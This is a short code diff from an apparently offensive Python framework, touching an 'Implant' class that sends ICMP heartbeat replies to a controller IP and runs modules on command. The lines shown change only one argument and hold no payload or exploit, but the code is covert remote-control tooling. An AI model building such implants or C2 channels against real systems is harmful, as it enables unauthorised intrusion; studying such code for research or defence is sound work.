@@ -56,7 +56,7 @@ class Implant(Host):
         """
 
         if shellpack['data'] == self.id:
-            self.send(self.controller_ip, "heartbeat", self.id, type="resp", icmp_type=0)
+            self.send(self.controller_ip, "heartbeat", self.id, icmp_type=0)
 
     def run_module(self, shellpack: dict) -> None:
         """
